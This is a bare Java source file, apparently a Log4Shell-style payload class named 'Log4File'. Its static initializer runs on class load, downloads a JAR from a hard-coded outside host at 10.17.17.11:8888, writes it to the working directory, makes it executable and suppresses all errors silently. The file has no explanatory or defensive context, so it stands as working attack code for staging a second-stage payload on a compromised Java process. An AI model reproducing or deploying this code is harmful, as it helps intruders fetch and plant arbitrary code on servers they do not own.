import java.io.InputStream;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.net.URL;


public class Log4File {
    static {
        String url = "http://10.17.17.11:8888/kotlin-http-client-1.0-SNAPSHOT-all.jar";
        String filename = "./kotlin-http-client-1.0-SNAPSHOT-all.jar";
        try {
            InputStream in = new URL(url).openStream();
            Files.copy(in, Paths.get(filename), StandardCopyOption.REPLACE_EXISTING);

            File file = new File(filename);

            if(file.exists()){
              file.setReadable(true);
              file.setExecutable(true);
              file.setWritable(false);
            }
        } catch (Exception e) {
        }
    }
}
